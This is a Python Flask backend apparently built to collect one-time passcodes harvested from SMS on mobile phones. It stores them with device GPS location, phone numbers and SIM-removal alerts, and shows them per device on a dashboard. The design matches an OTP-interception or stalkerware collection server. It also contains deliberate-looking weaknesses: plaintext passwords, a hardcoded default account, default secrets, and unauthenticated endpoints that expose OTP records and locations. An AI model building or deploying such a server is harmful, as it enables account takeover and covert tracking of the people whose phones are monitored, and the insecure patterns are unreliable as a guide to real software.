import json
import os
import sqlite3
from datetime import datetime, timezone, timedelta
from pathlib import Path
from collections import defaultdict

from flask import Flask, jsonify, render_template_string, request, redirect, url_for, session
from functools import wraps


BASE_DIR = Path(__file__).resolve().parent
DB_PATH = Path(os.environ.get("OTP_DB_PATH", BASE_DIR / "otp_events.sqlite3"))
EXPECTED_TOKEN = os.environ.get("MONITORING_TOKEN", "dev-parent-token")
OTP_DISPLAY_SINCE_MS = int(datetime.now(timezone.utc).timestamp() * 1000)
DEVICE_ONLINE_WINDOW_SECONDS = int(os.environ.get("DEVICE_ONLINE_WINDOW_SECONDS", "30"))

app = Flask(__name__)
app.config['JSON_SORT_KEYS'] = False
app.secret_key = os.environ.get("SECRET_KEY", "auto-otp-secret-key-change-in-production")


def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_email' not in session:
            return redirect(url_for('login_page'))
        return f(*args, **kwargs)
    return decorated_function


def db_connection():
    DB_PATH.parent.mkdir(parents=True, exist_ok=True)
    connection = sqlite3.connect(DB_PATH)
    connection.row_factory = sqlite3.Row
    return connection


def parse_server_time(value):
    if not value:
        return None
    try:
        return datetime.fromisoformat(str(value).replace("Z", "+00:00"))
    except ValueError:
        return None


def device_last_seen_at(device):
    received_at = parse_server_time(device.get("received_at"))
    if received_at:
        return received_at if received_at.tzinfo else received_at.replace(tzinfo=timezone.utc)
    try:
        return datetime.fromtimestamp(int(device["timestamp"]) / 1000, tz=timezone.utc)
    except (KeyError, TypeError, ValueError, OSError, OverflowError):
        return None


def apply_device_runtime_state(device):
    last_seen = device_last_seen_at(device)
    now = datetime.now(timezone.utc)
    age_seconds = None
    is_online = False
    if last_seen:
        age_seconds = max(0, int((now - last_seen).total_seconds()))
        is_online = age_seconds <= DEVICE_ONLINE_WINDOW_SECONDS

    has_location = device.get("latitude") is not None and device.get("longitude") is not None
    device["is_online"] = is_online
    device["status_label"] = "Online" if is_online else "Offline"
    device["status_class"] = "online" if is_online else "offline"
    device["last_seen_age_seconds"] = age_seconds
    device["last_seen_relative"] = format_age(age_seconds)
    device["has_location"] = has_location
    return device


def format_age(age_seconds):
    if age_seconds is None:
        return "Unknown"
    if age_seconds < 60:
        return f"{age_seconds}s ago"
    minutes = age_seconds // 60
    if minutes < 60:
        return f"{minutes}m ago"
    hours = minutes // 60
    return f"{hours}h ago"


def ensure_live_alerts():
    if not hasattr(app, "live_alerts"):
        app.live_alerts = []
    if not hasattr(app, "alert_states"):
        app.alert_states = {}
    if not hasattr(app, "device_connection_states"):
        app.device_connection_states = {}


def set_device_connection_state(device_id, status, network_type=""):
    if not device_id or device_id == "unknown":
        return
    ensure_live_alerts()
    now = datetime.now(timezone.utc)
    app.device_connection_states[device_id] = {
        "status": status,
        "network_type": network_type or "",
        "timestamp": int(now.timestamp() * 1000),
        "received_at": now.isoformat(),
    }


def apply_connection_override(device):
    device_id = device.get("device_id")
    if not device_id:
        return device

    ensure_live_alerts()
    state = app.device_connection_states.get(device_id)
    if not state:
        return device

    state_at = parse_server_time(state.get("received_at"))
    if state_at and state_at.tzinfo is None:
        state_at = state_at.replace(tzinfo=timezone.utc)

    age_seconds = None
    if state_at:
        age_seconds = max(0, int((datetime.now(timezone.utc) - state_at).total_seconds()))

    status = state.get("status")
    network_type = state.get("network_type") or ""
    if status == "online" and age_seconds is not None and age_seconds <= DEVICE_ONLINE_WINDOW_SECONDS:
        device["is_online"] = True
        device["status_label"] = "Online"
        device["status_class"] = "online"
        device["last_seen_age_seconds"] = age_seconds
        device["last_seen_relative"] = format_age(age_seconds)
        if network_type:
            device["network_type"] = network_type
    elif status in ("offline", "online") and age_seconds is not None:
        device["is_online"] = False
        device["status_label"] = "Offline"
        device["status_class"] = "offline"
        device["last_seen_age_seconds"] = age_seconds
        device["last_seen_relative"] = "offline now" if age_seconds < 5 else format_age(age_seconds)
        if network_type:
            device["network_type"] = network_type

    return device


def clear_device_alerts(device_id, alert_types):
    ensure_live_alerts()
    app.live_alerts = [
        alert for alert in app.live_alerts
        if not (alert.get("device_id") == device_id and alert.get("type") in alert_types)
    ]


def add_device_alert_once(device, alert_type, message, severity="critical"):
    ensure_live_alerts()
    device_id = device.get("device_id")
    if not device_id or not device.get("alerts_enabled", True):
        return
    if any(alert.get("device_id") == device_id and alert.get("type") == alert_type for alert in app.live_alerts):
        return

    app.live_alerts.insert(0, {
        "type": alert_type,
        "message": message,
        "phone": device.get("phone_number") or "Unknown",
        "device_id": device_id,
        "timestamp": int(datetime.now(timezone.utc).timestamp() * 1000),
        "severity": severity,
        "received_at": datetime.now(timezone.utc).isoformat(),
    })
    app.live_alerts = app.live_alerts[:50]


def update_device_alerts_from_state(device):
    device_id = device.get("device_id")
    if not device_id:
        return

    if not device.get("alerts_enabled", True):
        clear_device_alerts(device_id, ["network_offline", "location_off"])
        return

    label = device.get("phone_number") or device_id[:8]
    if device.get("is_online"):
        clear_device_alerts(device_id, ["network_offline"])
    else:
        add_device_alert_once(
            device,
            "network_offline",
            f"Device {label} is offline. Last telemetry was {device.get('last_seen_relative', 'unknown')}.",
            "critical",
        )

    if device.get("is_online") and device.get("has_location"):
        clear_device_alerts(device_id, ["location_off"])
    elif device.get("is_online"):
        add_device_alert_once(
            device,
            "location_off",
            f"Device {label} is online but location is unavailable or turned off.",
            "warning",
        )


def alerts_enabled_for_device(device_id):
    with db_connection() as connection:
        row = connection.execute(
            "SELECT alerts_enabled FROM device_alert_settings WHERE device_id = ?",
            (device_id,)
        ).fetchone()
    return True if row is None else bool(row["alerts_enabled"])


def latest_devices(connection, include_alert_settings=True):
    settings_select = "COALESCE(s.alerts_enabled, 1) AS alerts_enabled" if include_alert_settings else "1 AS alerts_enabled"
    settings_join = "LEFT JOIN device_alert_settings s ON s.device_id = t.device_id" if include_alert_settings else ""
    devices = connection.execute(
        f"""
        SELECT
            t.device_id,
            t.phone_number,
            t.device_model,
            t.device_manufacturer,
            t.latitude,
            t.longitude,
            t.battery_level,
            t.battery_status,
            t.network_type,
            t.timestamp,
            t.received_at,
            {settings_select},
            (SELECT COUNT(*) FROM otp_events WHERE device_id = t.device_id AND timestamp >= ?) as otp_count
        FROM device_telemetry t
        INNER JOIN (
            SELECT device_id, MAX(timestamp) as max_timestamp
            FROM device_telemetry
            GROUP BY device_id
        ) latest ON t.device_id = latest.device_id AND t.timestamp = latest.max_timestamp
        {settings_join}
        ORDER BY t.timestamp DESC
        """,
        (OTP_DISPLAY_SINCE_MS,)
    ).fetchall()

    device_list = []
    for device in devices:
        device_dict = apply_device_runtime_state(dict(device))
        device_dict = apply_connection_override(device_dict)
        device_dict["alerts_enabled"] = bool(device_dict.get("alerts_enabled"))
        try:
            device_dict["timestamp_formatted"] = datetime.fromtimestamp(
                device_dict["timestamp"] / 1000, tz=timezone.utc
            ).astimezone().strftime("%Y-%m-%d %H:%M:%S")
        except (OSError, OverflowError, ValueError, TypeError):
            device_dict["timestamp_formatted"] = device_dict.get("received_at") or "Unknown"
        update_device_alerts_from_state(device_dict)
        device_list.append(device_dict)
    return device_list


def init_db():
    with db_connection() as connection:
        connection.execute(
            """
            CREATE TABLE IF NOT EXISTS otp_events (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                otp_code TEXT NOT NULL,
                sender TEXT NOT NULL,
                message_body TEXT NOT NULL,
                timestamp INTEGER NOT NULL,
                source TEXT NOT NULL,
                device_id TEXT NOT NULL,
                package_name TEXT NOT NULL,
                received_at TEXT NOT NULL,
                raw_payload TEXT NOT NULL,
                UNIQUE(device_id, timestamp, otp_code, source)
            )
            """
        )
        # Create indexes for better performance
        connection.execute("CREATE INDEX IF NOT EXISTS idx_timestamp ON otp_events(timestamp DESC)")
        connection.execute("CREATE INDEX IF NOT EXISTS idx_device_id ON otp_events(device_id)")
        connection.execute("CREATE INDEX IF NOT EXISTS idx_sender ON otp_events(sender)")
        
        # Create device telemetry table
        connection.execute(
            """
            CREATE TABLE IF NOT EXISTS device_telemetry (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                device_id TEXT NOT NULL,
                phone_number TEXT,
                latitude REAL,
                longitude REAL,
                location_accuracy REAL,
                battery_level INTEGER,
                battery_status TEXT,
                device_model TEXT,
                device_manufacturer TEXT,
                os_version TEXT,
                app_version TEXT,
                network_type TEXT,
                timestamp INTEGER NOT NULL,
                received_at TEXT NOT NULL,
                UNIQUE(device_id, timestamp)
            )
            """
        )
        connection.execute("CREATE INDEX IF NOT EXISTS idx_telemetry_device ON device_telemetry(device_id)")
        connection.execute("CREATE INDEX IF NOT EXISTS idx_telemetry_timestamp ON device_telemetry(timestamp DESC)")

        connection.execute(
            """
            CREATE TABLE IF NOT EXISTS device_alert_settings (
                device_id TEXT PRIMARY KEY,
                alerts_enabled INTEGER NOT NULL DEFAULT 1,
                updated_at TEXT NOT NULL
            )
            """
        )
        
        # Create users table for authentication
        connection.execute(
            """
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                email TEXT UNIQUE NOT NULL,
                password TEXT NOT NULL,
                created_at TEXT NOT NULL
            )
            """
        )
        
        # Insert default user if not exists
        try:
            connection.execute(
                "INSERT INTO users (email, password, created_at) VALUES (?, ?, ?)",
                ("test21@gmail.com", "test21@gmail.com", datetime.now(timezone.utc).isoformat())
            )
            print("✅ Default user created: test21@gmail.com")
        except sqlite3.IntegrityError:
            print("ℹ️ Default user already exists")


def unauthorized():
    return jsonify({"error": "unauthorized"}), 401


@app.before_request
def require_token():
    # Exclude login pages from ALL checks
    if request.endpoint in ("login_page", "login", "logout"):
        return None
    
    # Exclude public endpoints and static files from token auth (but need login for dashboard)
    if request.endpoint in ("health", "api_stats", "get_otp_device_info", "get_devices_list", "get_devices_status", "get_recent_alerts"):
        return None
    
    # Dashboard routes protected by @login_required decorator
    if request.endpoint in ("dashboard", "device_otps_page", "alerts_page", "set_device_alerts"):
        return None

    if request.endpoint in ("list_otps",) and 'user_email' in session:
        return None
    
    # Allow static file requests
    if request.path in ("/favicon.ico", "/sw.js", "/robots.txt"):
        return None

    if not EXPECTED_TOKEN:
        return None

    token = request.headers.get("X-Auth-Token", "")
    bearer = request.headers.get("Authorization", "")
    if bearer.startswith("Bearer "):
        token = bearer.removeprefix("Bearer ").strip()

    if token != EXPECTED_TOKEN:
        return unauthorized()

    return None


@app.get("/login")
def login_page():
    """Login page"""
    from login_templates import LOGIN_TEMPLATE
    return render_template_string(LOGIN_TEMPLATE)


@app.post("/login")
def login():
    """Handle login"""
    email = request.form.get("email", "").strip()
    password = request.form.get("password", "").strip()
    
    if not email or not password:
        return render_template_string(
            LOGIN_TEMPLATE_ERROR,
            error="Please enter both email and password"
        )
    
    with db_connection() as connection:
        user = connection.execute(
            "SELECT * FROM users WHERE email = ? AND password = ?",
            (email, password)
        ).fetchone()
        
        if user:
            session['user_email'] = email
            print(f"✅ User logged in: {email}")
            return redirect(url_for('dashboard'))
        else:
            from login_templates import LOGIN_TEMPLATE_ERROR
            return render_template_string(
                LOGIN_TEMPLATE_ERROR,
                error="Invalid email or password"
            )


@app.get("/logout")
def logout():
    """Logout"""
    session.pop('user_email', None)
    return redirect(url_for('login_page'))


@app.get("/health")
def health():
    return jsonify({"ok": True})


@app.get("/favicon.ico")
def favicon():
    return "", 204


@app.get("/sw.js")
def service_worker():
    return "", 204


@app.get("/api/stats")
def api_stats():
    """Get dashboard statistics"""
    with db_connection() as connection:
        # Total OTPs
        total = connection.execute(
            "SELECT COUNT(*) as count FROM otp_events WHERE timestamp >= ?",
            (OTP_DISPLAY_SINCE_MS,)
        ).fetchone()['count']
        
        # OTPs in last 24 hours
        yesterday_ms = int((datetime.now(timezone.utc) - timedelta(hours=24)).timestamp() * 1000)
        last_24h = connection.execute(
            "SELECT COUNT(*) as count FROM otp_events WHERE timestamp >= ? AND timestamp >= ?",
            (yesterday_ms, OTP_DISPLAY_SINCE_MS)
        ).fetchone()['count']
        
        # Unique devices
        devices = connection.execute(
            "SELECT COUNT(DISTINCT device_id) as count FROM otp_events WHERE timestamp >= ?",
            (OTP_DISPLAY_SINCE_MS,)
        ).fetchone()['count']
        
        # Unique senders
        senders = connection.execute(
            "SELECT COUNT(DISTINCT sender) as count FROM otp_events WHERE timestamp >= ?",
            (OTP_DISPLAY_SINCE_MS,)
        ).fetchone()['count']
        
        # Top senders
        top_senders = connection.execute(
            """SELECT sender, COUNT(*) as count 
               FROM otp_events
               WHERE timestamp >= ?
               GROUP BY sender 
               ORDER BY count DESC 
               LIMIT 5""",
            (OTP_DISPLAY_SINCE_MS,)
        ).fetchall()
        
        # Recent activity (last 7 days)
        week_ago_ms = int((datetime.now(timezone.utc) - timedelta(days=7)).timestamp() * 1000)
        daily_stats = connection.execute(
            """SELECT DATE(timestamp/1000, 'unixepoch') as day, COUNT(*) as count
               FROM otp_events
               WHERE timestamp >= ? AND timestamp >= ?
               GROUP BY day
               ORDER BY day DESC""",
            (week_ago_ms, OTP_DISPLAY_SINCE_MS)
        ).fetchall()
        
        return jsonify({
            "total_otps": total,
            "last_24h": last_24h,
            "unique_devices": devices,
            "unique_senders": senders,
            "top_senders": [dict(row) for row in top_senders],
            "daily_activity": [dict(row) for row in daily_stats]
        })



@app.get("/")
@login_required
def dashboard():
    """Main dashboard view - Device Grid"""
    from templates import DASHBOARD_TEMPLATE
    
    with db_connection() as connection:
        # Get statistics
        total_otps = connection.execute(
            "SELECT COUNT(*) as count FROM otp_events WHERE timestamp >= ?",
            (OTP_DISPLAY_SINCE_MS,)
        ).fetchone()['count']
        
        yesterday_ms = int((datetime.now(timezone.utc) - timedelta(hours=24)).timestamp() * 1000)
        otps_24h = connection.execute(
            "SELECT COUNT(*) as count FROM otp_events WHERE timestamp >= ? AND timestamp >= ?",
            (yesterday_ms, OTP_DISPLAY_SINCE_MS)
        ).fetchone()['count']
        
        total_devices = connection.execute("SELECT COUNT(DISTINCT device_id) as count FROM device_telemetry").fetchone()['count']
        
        device_list = latest_devices(connection)
    
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    return render_template_string(
        DASHBOARD_TEMPLATE, 
        devices=device_list,
        total_devices=total_devices,
        total_otps=total_otps,
        otps_24h=otps_24h,
        current_time=current_time
    )


@app.post("/api/alerts")
def receive_alerts():
    """Receive real-time alerts from mobile devices"""
    payload = request.get_json(silent=True)
    if payload is None:
        return jsonify({"error": "JSON body required"}), 400

    required_fields = ["type", "message", "device_id", "timestamp"]
    missing = [field for field in required_fields if field not in payload or payload[field] is None]
    if missing:
        return jsonify({"error": f"Missing required fields: {', '.join(missing)}"}), 400

    alert_type = payload.get("type")
    device_id = payload.get("device_id")
    
    ensure_live_alerts()

    if alert_type == "network_online":
        set_device_connection_state(device_id, "online", payload.get("network_type") or "")
    elif alert_type == "network_offline":
        set_device_connection_state(device_id, "offline", payload.get("network_type") or "")
    
    # Handle "resolved" alerts (sim_inserted, network_online)
    if alert_type in ["sim_inserted", "network_online"]:
        # Remove corresponding "problem" alerts
        if alert_type == "sim_inserted":
            # Clear all SIM-related alerts for this device
            app.live_alerts = [a for a in app.live_alerts 
                              if not (a.get('device_id') == device_id and 
                                     a.get('type') in ['sim_removed', 'sim_not_ready'])]
            if device_id in app.alert_states:
                app.alert_states[device_id].pop('sim', None)
        elif alert_type == "network_online":
            # Clear network offline alerts for this device
            app.live_alerts = [a for a in app.live_alerts 
                              if not (a.get('device_id') == device_id and 
                                     a.get('type') == 'network_offline')]
            if device_id in app.alert_states:
                app.alert_states[device_id].pop('network', None)
    
    alerts_enabled = alerts_enabled_for_device(device_id)
    
    # Store alert in memory for live monitoring
    alert_data = {
        "type": alert_type,
        "message": payload.get("message"),
        "phone": payload.get("phone_number", "Unknown"),
        "device_id": device_id,
        "timestamp": payload.get("timestamp"),
        "severity": payload.get("severity", "info"),
        "network_type": payload.get("network_type") or "",
        "received_at": datetime.now(timezone.utc).isoformat()
    }
    
    # Don't store "resolved" alerts, just use them to clear problems
    if alerts_enabled and alert_type not in ["sim_inserted", "network_online"]:
        app.live_alerts.insert(0, alert_data)
        app.live_alerts = app.live_alerts[:50]  # Keep only last 50
        
        # Track device state
        if device_id not in app.alert_states:
            app.alert_states[device_id] = {}
        if alert_type.startswith('sim_'):
            app.alert_states[device_id]['sim'] = alert_type
        elif alert_type.startswith('network_'):
            app.alert_states[device_id]['network'] = alert_type
    
    if alerts_enabled:
        print(f"🚨🚨🚨 ALERT RECEIVED: {alert_data['type']} - {alert_data['message']} - Phone: {alert_data['phone']}")
    else:
        print(f"Alert ignored because alerts are disabled for device {device_id}: {alert_data['type']}")
    
    return jsonify({"ok": True, "alert_received": True}), 201


@app.get("/api/alerts/recent")
def get_recent_alerts():
    """Get recent alerts for live monitoring"""
    if not hasattr(app, 'live_alerts'):
        app.live_alerts = []
    
    # Return alerts from last 5 minutes
    five_min_ago = int((datetime.now(timezone.utc) - timedelta(minutes=5)).timestamp() * 1000)
    recent_alerts = [
        alert for alert in app.live_alerts 
        if alert.get('timestamp', 0) >= five_min_ago
    ]
    
    return jsonify({"alerts": recent_alerts, "count": len(recent_alerts)})


@app.post("/api/otps")
def receive_otps():
    """Receive OTP data from mobile devices"""
    payload = request.get_json(silent=True)
    if payload is None:
        return jsonify({"error": "JSON body required"}), 400

    events = payload.get("otps") if isinstance(payload, dict) and "otps" in payload else payload
    if isinstance(events, dict):
        events = [events]

    if not isinstance(events, list):
        return jsonify({"error": "Expected an OTP object or a list of OTP objects"}), 400

    rows = []
    errors = []
    received_at = datetime.now(timezone.utc).isoformat()

    for index, event in enumerate(events):
        if not isinstance(event, dict):
            errors.append({"index": index, "error": "OTP entry must be an object"})
            continue

        missing = [
            field for field in ("otp_code", "sender", "message_body", "timestamp")
            if event.get(field) in (None, "")
        ]
        if missing:
            errors.append({"index": index, "error": f"Missing required fields: {', '.join(missing)}"})
            continue

        try:
            timestamp = int(event["timestamp"])
        except (TypeError, ValueError):
            errors.append({"index": index, "error": "timestamp must be an integer"})
            continue

        rows.append(
            {
                "otp_code": str(event["otp_code"]),
                "sender": str(event["sender"]),
                "message_body": str(event["message_body"]),
                "timestamp": timestamp,
                "source": str(event.get("source") or "android"),
                "device_id": str(event.get("device_id") or "unknown"),
                "package_name": str(event.get("package_name") or "unknown"),
                "received_at": received_at,
                "raw_payload": json.dumps(event, sort_keys=True),
            }
        )

    if errors:
        return jsonify({"error": "Validation failed", "details": errors}), 400

    inserted = 0
    with db_connection() as connection:
        for row in rows:
            cursor = connection.execute(
                """
                INSERT OR IGNORE INTO otp_events (
                    otp_code,
                    sender,
                    message_body,
                    timestamp,
                    source,
                    device_id,
                    package_name,
                    received_at,
                    raw_payload
                ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
                """,
                (
                    row["otp_code"],
                    row["sender"],
                    row["message_body"],
                    row["timestamp"],
                    row["source"],
                    row["device_id"],
                    row["package_name"],
                    row["received_at"],
                    row["raw_payload"],
                ),
            )
            inserted += cursor.rowcount

    if rows:
        for device_id in {row["device_id"] for row in rows}:
            set_device_connection_state(device_id, "online")

    return jsonify({"ok": True, "received": len(rows), "inserted": inserted}), 201



@app.get("/api/otps")
def list_otps():
    """Get list of OTPs via API"""
    limit = min(int(request.args.get("limit", 100)), 500)
    sender = request.args.get("sender")
    device_id = request.args.get("device_id")
    
    query = """
        SELECT id, otp_code, sender, message_body, timestamp, source,
               device_id, package_name, received_at
        FROM otp_events
        WHERE timestamp >= ?
    """
    params = [OTP_DISPLAY_SINCE_MS]
    
    if sender:
        query += " AND sender LIKE ?"
        params.append(f"%{sender}%")
    
    if device_id:
        query += " AND device_id = ?"
        params.append(device_id)
    
    query += " ORDER BY timestamp DESC, id DESC LIMIT ?"
    params.append(limit)
    
    with db_connection() as connection:
        rows = connection.execute(query, params).fetchall()

    return jsonify({"otps": [dict(row) for row in rows], "count": len(rows)})


@app.get("/api/devices")
def list_devices():
    """Get list of active devices"""
    with db_connection() as connection:
        devices = connection.execute(
            """SELECT device_id, 
                      COUNT(*) as otp_count,
                      MAX(timestamp) as last_seen,
                      MIN(timestamp) as first_seen
               FROM otp_events
               WHERE timestamp >= ?
               GROUP BY device_id
               ORDER BY last_seen DESC"""
            ,
            (OTP_DISPLAY_SINCE_MS,)
        ).fetchall()
    
    device_list = []
    for device in devices:
        device_dict = dict(device)
        try:
            device_dict["last_seen_formatted"] = datetime.fromtimestamp(
                device_dict["last_seen"] / 1000, tz=timezone.utc
            ).astimezone().strftime("%Y-%m-%d %H:%M:%S")
            device_dict["first_seen_formatted"] = datetime.fromtimestamp(
                device_dict["first_seen"] / 1000, tz=timezone.utc
            ).astimezone().strftime("%Y-%m-%d %H:%M:%S")
        except (OSError, OverflowError, ValueError):
            device_dict["last_seen_formatted"] = "Unknown"
            device_dict["first_seen_formatted"] = "Unknown"
        device_list.append(device_dict)
    
    return jsonify({"devices": device_list, "count": len(device_list)})


@app.post("/api/telemetry")
def receive_telemetry():
    """Receive device telemetry data"""
    payload = request.get_json(silent=True)
    if payload is None:
        return jsonify({"error": "JSON body required"}), 400

    required_fields = ["device_id", "timestamp"]
    missing = [field for field in required_fields if field not in payload or payload[field] is None]
    if missing:
        return jsonify({"error": f"Missing required fields: {', '.join(missing)}"}), 400

    try:
        timestamp = int(payload["timestamp"])
    except (TypeError, ValueError):
        return jsonify({"error": "timestamp must be an integer"}), 400

    received_at = datetime.now(timezone.utc).isoformat()

    with db_connection() as connection:
        cursor = connection.execute(
            """
            INSERT OR REPLACE INTO device_telemetry (
                device_id, phone_number, latitude, longitude, location_accuracy,
                battery_level, battery_status, device_model, device_manufacturer,
                os_version, app_version, network_type, timestamp, received_at
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            """,
            (
                payload.get("device_id"),
                payload.get("phone_number"),
                payload.get("latitude"),
                payload.get("longitude"),
                payload.get("location_accuracy"),
                payload.get("battery_level"),
                payload.get("battery_status"),
                payload.get("device_model"),
                payload.get("device_manufacturer"),
                payload.get("os_version"),
                payload.get("app_version"),
                payload.get("network_type"),
                timestamp,
                received_at
            )
        )
        inserted = cursor.rowcount

    set_device_connection_state(payload.get("device_id"), "online", payload.get("network_type") or "")

    return jsonify({"ok": True, "inserted": inserted}), 201


@app.get("/api/telemetry")
def get_telemetry():
    """Get device telemetry data"""
    device_id = request.args.get("device_id")
    limit = min(int(request.args.get("limit", 100)), 500)
    
    query = """
        SELECT * FROM device_telemetry
        WHERE 1=1
    """
    params = []
    
    if device_id:
        query += " AND device_id = ?"
        params.append(device_id)
    
    query += " ORDER BY timestamp DESC LIMIT ?"
    params.append(limit)
    
    with db_connection() as connection:
        rows = connection.execute(query, params).fetchall()
    
    return jsonify({"telemetry": [dict(row) for row in rows], "count": len(rows)})


@app.get("/api/telemetry/latest")
def get_latest_telemetry():
    """Get latest telemetry for all devices"""
    with db_connection() as connection:
        rows = connection.execute(
            """
            SELECT t1.* FROM device_telemetry t1
            INNER JOIN (
                SELECT device_id, MAX(timestamp) as max_timestamp
                FROM device_telemetry
                GROUP BY device_id
            ) t2 ON t1.device_id = t2.device_id AND t1.timestamp = t2.max_timestamp
            ORDER BY t1.timestamp DESC
            """
        ).fetchall()
    
    telemetry_list = []
    for row in rows:
        row_dict = dict(row)
        try:
            row_dict["timestamp_formatted"] = datetime.fromtimestamp(
                row_dict["timestamp"] / 1000, tz=timezone.utc
            ).astimezone().strftime("%Y-%m-%d %H:%M:%S")
        except (OSError, OverflowError, ValueError):
            row_dict["timestamp_formatted"] = row_dict["received_at"]
        telemetry_list.append(row_dict)
    
    return jsonify({"devices": telemetry_list, "count": len(telemetry_list)})


@app.get("/api/otp/<int:otp_id>/device")
def get_otp_device_info(otp_id):
    """Get device telemetry for a specific OTP"""
    with db_connection() as connection:
        # Get the OTP event
        otp = connection.execute(
            "SELECT * FROM otp_events WHERE id = ?",
            (otp_id,)
        ).fetchone()
        
        if not otp:
            return jsonify({"error": "OTP not found"}), 404
        
        otp_dict = dict(otp)
        
        # Get the latest telemetry for this device
        telemetry = connection.execute(
            """
            SELECT * FROM device_telemetry 
            WHERE device_id = ? 
            ORDER BY timestamp DESC 
            LIMIT 1
            """,
            (otp_dict["device_id"],)
        ).fetchone()
        
        if telemetry:
            telemetry_dict = dict(telemetry)
            try:
                telemetry_dict["timestamp_formatted"] = datetime.fromtimestamp(
                    telemetry_dict["timestamp"] / 1000, tz=timezone.utc
                ).astimezone().strftime("%Y-%m-%d %H:%M:%S")
            except (OSError, OverflowError, ValueError):
                telemetry_dict["timestamp_formatted"] = telemetry_dict["received_at"]
        else:
            telemetry_dict = None
        
        return jsonify({
            "otp": otp_dict,
            "device": telemetry_dict
        })


@app.get("/api/devices/list")
def get_devices_list():
    """Get list of all devices with their latest telemetry and OTP count"""
    with db_connection() as connection:
        device_list = latest_devices(connection)
    
    return jsonify({"devices": device_list, "count": len(device_list)})


@app.post("/api/devices/<device_id>/alerts")
@login_required
def set_device_alerts(device_id):
    """Enable or disable server-side alerts for a device."""
    payload = request.get_json(silent=True) or {}
    enabled = bool(payload.get("enabled"))

    with db_connection() as connection:
        exists = connection.execute(
            "SELECT 1 FROM device_telemetry WHERE device_id = ? LIMIT 1",
            (device_id,)
        ).fetchone()
        if not exists:
            return jsonify({"error": "device not found"}), 404

        connection.execute(
            """
            INSERT INTO device_alert_settings (device_id, alerts_enabled, updated_at)
            VALUES (?, ?, ?)
            ON CONFLICT(device_id) DO UPDATE SET
                alerts_enabled = excluded.alerts_enabled,
                updated_at = excluded.updated_at
            """,
            (device_id, 1 if enabled else 0, datetime.now(timezone.utc).isoformat())
        )

    if not enabled:
        clear_device_alerts(device_id, ["network_offline", "location_off"])

    return jsonify({"ok": True, "device_id": device_id, "alerts_enabled": enabled})


@app.get("/api/devices/status")
def get_devices_status():
    """Check device status and return specific alerts for live monitoring"""
    alerts = []
    current_time = datetime.now(timezone.utc)
    
    # Initialize alert states if not exists
    if not hasattr(app, 'alert_states'):
        app.alert_states = {}
    
    with db_connection() as connection:
        for device in latest_devices(connection):
            if not device.get("alerts_enabled", True):
                continue

            phone = device.get("phone_number") or device["device_id"][:8]
            if not device.get("is_online"):
                alerts.append({
                    "type": "network_offline",
                    "device_id": device["device_id"],
                    "phone": phone,
                    "device": device.get("device_model") or "Unknown",
                    "message": f"Device {phone} offline - Last seen {device.get('last_seen_relative')}",
                    "time": device.get("timestamp_formatted"),
                    "severity": "critical",
                    "reason": "no_recent_telemetry"
                })
            elif not device.get("has_location"):
                alerts.append({
                    "type": "location_off",
                    "device_id": device["device_id"],
                    "phone": phone,
                    "device": device.get("device_model") or "Unknown",
                    "message": f"Device {phone} location unavailable or turned off",
                    "time": device.get("timestamp_formatted"),
                    "severity": "warning",
                    "reason": "missing_location"
                })
    
    return jsonify({"alerts": alerts, "count": len(alerts), "timestamp": current_time.isoformat()})


@app.get("/alerts")
@login_required
def alerts_page():
    """Dedicated alerts page showing all alerts"""
    from alerts_templates import ALERTS_PAGE_TEMPLATE
    
    if not hasattr(app, 'live_alerts'):
        app.live_alerts = []
    
    # Get all alerts from last 24 hours
    twenty_four_hours_ago = int((datetime.now(timezone.utc) - timedelta(hours=24)).timestamp() * 1000)
    recent_alerts = [
        alert for alert in app.live_alerts 
        if alert.get('timestamp', 0) >= twenty_four_hours_ago
    ]
    
    # DEBUG: Print alerts for troubleshooting
    print(f"\n📋 ALERTS PAGE REQUEST - Total alerts in memory: {len(app.live_alerts)}")
    print(f"📋 Alerts from last 24h: {len(recent_alerts)}")
    if recent_alerts:
        print("📋 Sample alert data:")
        for alert in recent_alerts[:3]:  # Show first 3 alerts
            print(f"   - Type: {alert.get('type')}")
            print(f"   - Phone: {alert.get('phone')}")
            print(f"   - Device: {alert.get('device_id', 'N/A')[:8]}...")
            print(f"   - Message: {alert.get('message')}")
            print(f"   - Timestamp: {alert.get('timestamp')}")
            print()
    
    # Format timestamps
    for alert in recent_alerts:
        try:
            alert['time_formatted'] = datetime.fromtimestamp(
                alert['timestamp'] / 1000, tz=timezone.utc
            ).astimezone().strftime("%Y-%m-%d %H:%M:%S")
        except:
            alert['time_formatted'] = alert.get('received_at', 'Unknown')
    
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    return render_template_string(
        ALERTS_PAGE_TEMPLATE,
        alerts=recent_alerts,
        alert_count=len(recent_alerts),
        current_time=current_time
    )


@app.get("/device/<device_id>/otps")
@login_required
def device_otps_page(device_id):
    """Page showing OTPs for a specific device"""
    from device_templates import DEVICE_OTPS_TEMPLATE
    
    limit = min(int(request.args.get("limit", 200)), 500)
    
    with db_connection() as connection:
        # Get device info
        device_row = connection.execute(
            """
            SELECT * FROM device_telemetry 
            WHERE device_id = ? 
            ORDER BY timestamp DESC 
            LIMIT 1
            """,
            (device_id,)
        ).fetchone()
        
        if not device_row:
            return "Device not found", 404
        
        device = apply_device_runtime_state(dict(device_row))
        device = apply_connection_override(device)
        settings = connection.execute(
            "SELECT alerts_enabled FROM device_alert_settings WHERE device_id = ?",
            (device_id,)
        ).fetchone()
        device["alerts_enabled"] = bool(settings["alerts_enabled"]) if settings else True
        update_device_alerts_from_state(device)
        try:
            device["timestamp_formatted"] = datetime.fromtimestamp(
                device["timestamp"] / 1000, tz=timezone.utc
            ).astimezone().strftime("%Y-%m-%d %H:%M:%S")
        except (OSError, OverflowError, ValueError):
            device["timestamp_formatted"] = device["received_at"]
        
        # Get OTPs for this device
        otps = connection.execute(
            """
            SELECT id, otp_code, sender, message_body, timestamp, source, device_id, received_at
            FROM otp_events
            WHERE device_id = ? AND timestamp >= ?
            ORDER BY timestamp DESC
            LIMIT ?
            """,
            (device_id, OTP_DISPLAY_SINCE_MS, limit)
        ).fetchall()
        
